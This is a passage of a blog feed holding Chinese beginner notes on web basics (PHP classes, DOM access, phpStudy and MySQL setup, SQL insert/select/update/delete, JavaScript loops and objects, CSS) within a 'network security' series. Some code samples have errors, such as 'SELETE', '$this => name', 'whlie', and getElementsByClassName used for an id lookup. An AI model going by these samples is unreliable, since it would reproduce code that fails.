title="类和对象"></a>类和对象</h3><p><strong>面向对象概念</strong></p><ul><li><p>类定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作</p></li><li><p>对象是类的实例</p></li><li><p>成员变量是定义在类内部的变量。在类被实例化为对象后，该变量即可称为对象的属性</p></li><li><p>成员函数是定义在类的内部，可用于访问对象的数据</p></li></ul><p><strong>定义类</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 解决中文乱码问题</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">phpClass</span></span>&#123;</span><br><span class="line">        <span class="comment">// 成员变量</span></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$var1</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$var2</span> = <span class="string">&quot;constant string&quot;</span>;</span><br><span class="line">        <span class="comment">// 成员函数</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"><span class="variable">$arg1</span> , <span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">            代码</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>定义类的语法解析：</strong></p><ul><li>类使用class关键字后加上类名定义</li><li>类名后的一对大括号({})内可以定义变量和方法</li><li>类的变量使用var 来声明,变量也可以初始化值</li><li>函数定义类似PHP函数的定义，但函数只能通过该类及其实例化的对象访问</li><li>变量$this代表自身的对象。</li></ul><p><strong>类定义案例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Teacher</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>,<span class="variable language_">$this</span> =&gt; name,<span class="string">&#x27;年龄：&#x27;</span>,<span class="variable language_">$this</span> =&gt; age,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>使用类实例化对象</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Teacher</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>,<span class="variable language_">$this</span> -&gt; name,<span class="string">&#x27;年龄：&#x27;</span>,<span class="variable language_">$this</span> -&gt; age,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$t1</span> = <span class="keyword">new</span> <span class="title class_">Teacher</span>;</span><br><span class="line">    <span class="variable">$t1</span> -&gt; name = <span class="string">&#x27;张飞&#x27;</span>;</span><br><span class="line">    <span class="variable">$t1</span> -&gt; age = <span class="number">30</span>;</span><br><span class="line">    <span class="variable">$t1</span> -&gt; <span class="title function_ invoke__">show</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$t2</span> = <span class="keyword">new</span> <span class="title class_">Teacher</span>;</span><br><span class="line">    <span class="variable">$t2</span> -&gt; name = <span class="string">&#x27;赵云&#x27;</span>;</span><br><span class="line">    <span class="variable">$t2</span> -&gt; age = <span class="number">27</span>;</span><br><span class="line">    <span class="variable">$t2</span> -&gt; <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用基础4</title>
      <link href="/posts/webbase4.html"/>
      <url>/posts/webbase4.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用基础"><a href="#Web应用基础" class="headerlink" title="Web应用基础"></a>Web应用基础</h1><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="DOM相关概念"><a href="#DOM相关概念" class="headerlink" title="DOM相关概念"></a>DOM相关概念</h3><p><strong>什么DOM？</strong></p><ul><li>全称为”DocumentobjectModel”文档对象模型，通过对象提供操作HTML文档的方法</li><li>每个html文件在浏览器中都视为一个文档，因此，操作文档实际就是操作页面中的元素</li></ul><p><strong>什么节点对象？</strong></p><ul><li>在DOM文档中，Js会对文档中的元素、属性、文本甚至注释进行封装，形成一个个节点对象</li><li>为节点对象提供相关的属性和方法，通过这些属性和方法操作页面中任何一个元素</li></ul><h3 id="获取DOM元素的方法"><a href="#获取DOM元素的方法" class="headerlink" title="获取DOM元素的方法"></a>获取DOM元素的方法</h3><ul><li>根据标签名获取元素节点列表</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数为标签名，返回值节点列表</span></span><br><span class="line"><span class="keyword">var</span> elemsByTag = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(标签名);</span><br></pre></td></tr></table></figure><ul><li>根据class属性值获取元素节点列表</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数为class属性值，返回值节点列表</span></span><br><span class="line"><span class="keyword">var</span> elemsByClass = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="keyword">class</span>属性值);</span><br></pre></td></tr></table></figure><ul><li>根据id获取元素节点</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数为id属性值，返回值节点</span></span><br><span class="line"><span class="keyword">var</span> elemById = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="title class_">Id</span>属性值);</span><br></pre></td></tr></table></figure><ul><li>案例</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>年龄：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">id</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;displayUserInfo()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">displayUserInfo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> name = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> age = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;age&quot;</span>).<span class="property">value</span>; </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;您的姓名是：&quot;</span> + name + <span class="string">&quot;&lt;br&gt;您的年龄是：&quot;</span> + age);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="部署Web服务器及应用环境"><a href="#部署Web服务器及应用环境" class="headerlink" title="部署Web服务器及应用环境"></a>部署Web服务器及应用环境</h2><h3 id="phpStudy介绍"><a href="#phpStudy介绍" class="headerlink" title="phpStudy介绍"></a>phpStudy介绍</h3><ul><li><p>单独安装配置Web服务器端环境复杂易出错</p></li><li><p>我们选择phpstudy套装软件</p></li><li><p>phpStudy包括[Apache+PHP+Mysql]</p></li><li><p>phpStudy官方网站：<a href="https://www.xp.cn/">https://www.xp.cn</a></p></li></ul><h3 id="选择安装版本"><a href="#选择安装版本" class="headerlink" title="选择安装版本"></a>选择安装版本</h3><ul><li>phpStudy2016稳定易用</li><li>安装简单</li><li>管理方便</li></ul><h2 id="MySQL及MySQL-Front简介"><a href="#MySQL及MySQL-Front简介" class="headerlink" title="MySQL及MySQL-Front简介"></a>MySQL及MySQL-Front简介</h2><h3 id="MySQL简介"><a href="#MySQL简介" class="headerlink" title="MySQL简介"></a>MySQL简介</h3><ul><li>MySQL是一个关系型数据库管理系统</li><li>由瑞典MySQL AB公司开发，目前属于Oracle 旗下产品</li><li>是WEB应用中最好的RDBMS(关系数据库管理系统)应用软件</li><li>官网 <a href="https://www.mysql.com/">https://www.mysql.com/</a></li><li>支持结构化查询语言SQL</li></ul><p><strong>什么是数据库</strong></p><ul><li>数据库是按照数据结构来组织、存储和管理数据的仓库</li></ul><p><strong>什么是关系型数据库</strong></p><ul><li>建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据</li></ul><p><strong>关系型数据库相关术语</strong></p><ul><li>数据库：数据库是一些关联表的集合</li><li>数据表：类似一个简单的电子表格</li><li>主键：主键是唯一的，一个数据表中只能包含一个主键</li><li>索引：使用索引可快速访问数据库表中的特定信息，类似于书籍的目录</li></ul><h3 id="MySQL-Front简介"><a href="#MySQL-Front简介" class="headerlink" title="MySQL-Front简介"></a>MySQL-Front简介</h3><p><strong>MySQL-Front是一款小巧的MYSQL图形化管理工具</strong></p><ul><li>phpStudy套件中已经集成了MySQL-Front</li></ul><p><img src="/../img/img_artical/net_sec/12.4.1.png" alt="12.4.1"></p><p><strong>进入MySQL-Front管理主界面</strong></p><ul><li>点击MySQL管理器，选择MySQL-Front菜单</li></ul><p><img src="/../img/img_artical/net_sec/12.4.2.png" alt="12.4.2"></p><p><strong>在打开登录信息窗口中，点击属性按钮</strong></p><ul><li>在localhost的配置对话框中输入用户名称、密码</li><li>确定后，点击打开登录窗口中的打开按钮</li></ul><p><img src="/../img/img_artical/net_sec/12.4.3.png" alt="12.4.3"></p><p><strong>进入MySQL-Front主界面</strong></p><p><img src="/../img/img_artical/net_sec/12.4.4.png" alt="12.4.4"></p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="SQL简介"><a href="#SQL简介" class="headerlink" title="SQL简介"></a>SQL简介</h3><ul><li>SQL全称是Structured Query Language，结构化查询语言</li><li>是一种数据库查询和程序设计语言</li><li>用于存取数据以及查询、更新和管理关系型数据库系统</li><li>SQL语言大小写不敏感</li></ul><p><strong>SQL具有数据定义、数据操纵和数据控制的功能</strong></p><p><strong>数据定义语言DDL （Data Define Language）</strong></p><ul><li>通过CREATE，ALTER和DROP实现创建新表或修改、删除表</li></ul><p><strong>数据查询语言DQL （Data Query Language）</strong></p><ul><li>通过SELECT、WHERE，ORDERBY，GROUPBY和HAVING实现数据的查询</li></ul><p><strong>数据操作语言DML （Data Manipulation Language）</strong></p><ul><li>通过INSERT、UPDATE和DELETE实现数据的添加、修改和删除</li></ul><p><strong>数据控制语言DCL（Data Control Language）</strong></p><ul><li>通过GRANT或REVOKE实现权限控制</li></ul><h2 id="表数据的增删改查"><a href="#表数据的增删改查" class="headerlink" title="表数据的增删改查"></a>表数据的增删改查</h2><h3 id="使用SQL插入数据"><a href="#使用SQL插入数据" class="headerlink" title="使用SQL插入数据"></a>使用SQL插入数据</h3><p><strong>插入数据语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(字段<span class="number">1</span>,字段<span class="number">2</span>,...,字段n)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">(值<span class="number">1</span>,值<span class="number">2</span>，...,值n);</span><br></pre></td></tr></table></figure><p><strong>插入数据案例</strong></p><ul><li>如果数据是字符型或日期型，必须使用单引号或者双引号</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> ADMIN(NAME,PWD) <span class="keyword">VALUES</span>(<span class="string">&#x27;ntd&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="使用SQL查询数据"><a href="#使用SQL查询数据" class="headerlink" title="使用SQL查询数据"></a>使用SQL查询数据</h3><p><strong>查询数据语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELETE 字段<span class="number">1</span>,字段<span class="number">2</span>,... <span class="keyword">FROM</span> 表名</span><br><span class="line">[<span class="keyword">WHERE</span> 子句]</span><br></pre></td></tr></table></figure><p><strong>查询数据案例</strong></p><ul><li>查询语句中的字段之间使用逗号(,)分割</li><li>SELECT命令可以读取一条或者多条记录</li><li>你可以使用星号(*)来表示返回表的所有字段数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin;</span><br></pre></td></tr></table></figure><p>**WHERE子句**</p><ul><li>查询语句中你可以使用一个或者多个表，表之间使用逗号</li><li>使用AND 或者 OR指定一个或多个条件</li><li>WHERE子句类似于程序语言中的if条件</li><li>查询语句中的字段之间使用逗号（,）分割</li><li>SELECT命令可以读取一条或者多条记录</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELETE 字段<span class="number">1</span>,字段<span class="number">2</span>,... <span class="keyword">FROM</span> 表名</span><br><span class="line">[<span class="keyword">WHERE</span> 条件<span class="number">1</span> [<span class="keyword">AND</span>[<span class="keyword">OR</span>]] 条件<span class="number">2</span> ...]</span><br></pre></td></tr></table></figure><p><strong>WHERE子句案例</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin;</span><br><span class="line"><span class="keyword">select</span> name,pwd <span class="keyword">from</span> admin;</span><br><span class="line"><span class="keyword">select</span> name,pwd <span class="keyword">from</span> admin <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;ntd&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;ntd&#x27;</span> <span class="keyword">and</span> pwd<span class="operator">=</span><span class="string">&#x27;123456&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="使用SQL语句修改数据"><a href="#使用SQL语句修改数据" class="headerlink" title="使用SQL语句修改数据"></a>使用SQL语句修改数据</h3><p><strong>修改数据语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 字段<span class="number">1</span><span class="operator">=</span>新值<span class="number">1</span>,字段<span class="number">2</span><span class="operator">=</span>新值<span class="number">2</span>,...</span><br><span class="line">[<span class="keyword">WHERE</span>子句];</span><br></pre></td></tr></table></figure><p><strong>修改数据案例</strong></p><ul><li>可以修改一个或多个字段</li><li>可以结合WHERE子句，否则更新所有记录</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> admin <span class="keyword">set</span> pwd<span class="operator">=</span><span class="string">&#x27;456789&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="使用SQL语句删除数据"><a href="#使用SQL语句删除数据" class="headerlink" title="使用SQL语句删除数据"></a>使用SQL语句删除数据</h3><p><strong>删除数据语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span>子句];</span><br></pre></td></tr></table></figure><p><strong>删除数据案例</strong></p><ul><li>如果没有指定WHERE子句，将删除全部数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web应用基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用基础3</title>
      <link href="/posts/webbase3.html"/>
      <url>/posts/webbase3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用基础"><a href="#Web应用基础" class="headerlink" title="Web应用基础"></a>Web应用基础</h1><h2 id="JS循环结构"><a href="#JS循环结构" class="headerlink" title="JS循环结构"></a>JS循环结构</h2><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><p><strong>什么是循环结构</strong></p><ul><li>重复执行的动作</li><li>JavaScript 支持for、 while、do-while等不同类型的循环</li></ul><h3 id="循环结构-1"><a href="#循环结构-1" class="headerlink" title="循环结构"></a>循环结构</h3><p><strong>for语句</strong></p><ul><li>语法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(表达式<span class="number">1</span>;表达式<span class="number">2</span>;表达式<span class="number">3</span>)&#123;</span><br><span class="line">语句序列;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/12.3.1.png" alt="12.3.1"></p><p><strong>while语句</strong></p><ul><li>语法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(条件表达式)&#123;</span><br><span class="line">需要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/12.3.2.png" alt="12.3.2"></p><p><strong>do-while语句</strong></p><ul><li>语法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">语句序列</span><br><span class="line">&#125;<span class="title function_">whlie</span>(条件表达式);</span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/12.3.3.png" alt="12.3.3"></p><h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><ul><li><p>break用于跳出循环</p></li><li><p>continue用于结束一次循环，继续执行下一次循环</p></li></ul><p><strong>continue语句案例</strong></p><ul><li>在控制台打印1~10之间的奇数（不要输出偶数）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ; i &lt;= <span class="number">10</span> ;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">2</span> ==<span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><ul><li>函数的作用就是封装和重用</li><li>函数中的代码，只有在调用时，才会被执行</li><li>语法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">funNumber</span>(<span class="params">形参</span>)&#123;</span><br><span class="line">    语句块</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数调用</span></span><br><span class="line"><span class="title function_">funNumber</span>(实参);</span><br></pre></td></tr></table></figure><ul><li>函数使用案例</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myMax</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> max = <span class="title function_">myMax</span>(<span class="number">100</span> , <span class="number">20</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(max);</span><br></pre></td></tr></table></figure><h2 id="JavaScript对象"><a href="#JavaScript对象" class="headerlink" title="JavaScript对象"></a>JavaScript对象</h2><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><ul><li>对象包含属性和方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name : <span class="string">&quot;zhangsan&quot;</span>,</span><br><span class="line">    age : <span class="number">18</span>,</span><br><span class="line">    sayName : <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">person.<span class="title function_">sayName</span>();</span><br></pre></td></tr></table></figure><ul><li>案例</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义手机对象</span></span><br><span class="line"><span class="keyword">var</span> phone = &#123;</span><br><span class="line">    brand : <span class="string">&quot;apple&quot;</span>,</span><br><span class="line">    color : <span class="string">&quot;Silver&quot;</span>,</span><br><span class="line">    <span class="comment">// 显示手机信息的方法</span></span><br><span class="line">    displayPhoneInfo : <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;手机品牌：&quot;</span> + <span class="variable language_">this</span>.<span class="property">brand</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;手机颜色：&quot;</span> + <span class="variable language_">this</span>.<span class="property">color</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用显示手机信息的方法</span></span><br><span class="line">phone.<span class="title function_">displayPhoneInfo</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web应用基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用基础2</title>
      <link href="/posts/webbase2.html"/>
      <url>/posts/webbase2.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用基础"><a href="#Web应用基础" class="headerlink" title="Web应用基础"></a>Web应用基础</h1><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><h3 id="CSS介绍"><a href="#CSS介绍" class="headerlink" title="CSS介绍"></a>CSS介绍</h3><ul><li>CSS 指层叠样式表（Cascading Style Sheets）</li><li>与HTML相辅相成，实现网页的排版布局与样式美化</li></ul><h3 id="CSS使用"><a href="#CSS使用" class="headerlink" title="CSS使用"></a>CSS使用</h3><p><strong>根据CSS在页面中呈现的方式不同，有以下三种使用方式</strong></p><ul><li>内联</li><li>内嵌</li><li>外链</li></ul><h3 id="CSS内联"><a href="#CSS内联" class="headerlink" title="CSS内联"></a>CSS内联</h3><p><strong>内联(行内)样式</strong></p><ul><li>任意的标签都有style属性,用于某个元素的样式设置</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">标签名</span> <span class="attr">style</span>=<span class="string">“样式声明”</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>样式声明：由CSS属性和值组成</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style=&quot;属性:值;属性:值;&quot;</span><br></pre></td></tr></table></figure><ul><li>内联（行内）样式案例</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 样式全部使用style实现 --&gt;</span></span><br><span 